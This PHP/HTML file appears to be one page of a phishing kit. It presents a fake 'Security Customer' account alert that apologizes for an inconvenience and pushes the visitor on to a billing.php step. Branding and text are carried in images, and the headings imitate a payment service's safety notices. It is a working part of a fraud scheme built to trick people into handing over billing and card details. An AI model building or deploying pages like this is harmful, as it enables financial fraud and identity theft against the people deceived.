<?php

require_once 'hostname.php';


      session_start();

?>

    <html>
        <head>
            <meta content="text/html; charset=UTF-8"></meta>
            <title>

                  Security Customer

            </title>
            <meta charset="utf-8"></meta>
            <link href="img/icon.png" <link="" rel="shortcut icon"></link>
			<link href="css/secure1.css" rel="stylesheet"></link>
			<link href="css/secure2.css" rel="stylesheet"></link>
        </head>
        <body>
            <div id="page" class="">
                <header class="gblHeader">
                    <div class="utility in">
                        <div class="wrapper">
                            <div class="logo">
                                <a href="secure.php">
                                    <img src="img/secure/logo_que haces_106x29.png" alt="img "></img>
                                </a>
                            </div>
                        </div>
                    </div>
                </header>
                <br></br>
                <section id="content" class="" tabindex="-1">
                    <section id="main">
                        <br></br>
                        <center>
                            <a href="secure.php">
                                <img src="img/secure/sec.png"></img>
                            </a>
                        </center>
                        <br></br>
                        <br></br>
                        <div class="nsb_10_14">
                            <div class="one column authTray">
                                <div class="trayNavOuter">
                                    <div class="trayNavInner">
                                        <section id="entry">
                                            <header>
                                                <img src="img/secure/vef.png"></img>
                                                <p>

                                                     We apologize for any inconvenience.  

                                                </p>
                                                <br></br>
                                            </header>
                                            <div>
                                                <div class="selectDropdown">
                                                    <br></br>
                                                    <img src="img/secure/restisma.png"></img>
                                                    <div class="buttons">
                                                        <input class="button" type="submit" onclick=" window.location.href='billing.php'" value="Continue"></input>

                                                    </div>
                                                </div>
                                            </div>
                                        </section>
                                    </div>
                                </div>
                            </div>
                            <div class="two column nogutter">
                                <section class="section-one">
                                    <h2>

                                        Help us keep you safer

                                    </h2>
                                    <p>
                                        <img src="img/secure/anonisma99.png"></img>
                                    </p>
                                </section>
                                <section class="section-two">
                                    <h2>

                                        All day, every day

                                    </h2>
                                    <p>
                                        <img src="img/secure/anonisma88.png"></img>
                                    </p>
                                </section>
                            </div>
                        </div>
                    </section>
                    <footer>
                        <center>
                            <a href="secure.php">
                                <img src="img/secure/footer1.png"></img>
                            </a>
                        </center>
                    </footer>
                </section>
            </div>
        </body>
    </html>